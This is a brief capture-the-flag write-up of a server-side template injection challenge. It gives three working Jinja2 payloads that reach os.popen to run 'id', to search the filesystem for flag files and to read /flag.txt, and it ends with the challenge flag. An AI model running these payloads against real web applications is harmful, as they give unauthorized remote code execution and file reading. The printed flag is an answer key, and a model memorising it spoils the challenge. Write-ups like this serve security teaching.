# Web07 - 03: SSTI

The ctf name hints us twords SSTI payloads.
After testing the basic ones we find that the payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` works.
So we have a Jinja2 server.

I then made a payload to find the file flag.
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('find / -type f -name "flag*"').read() }}`

And the simply:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}`

flag: `ALGOLYMP{rce_thru_ssti}`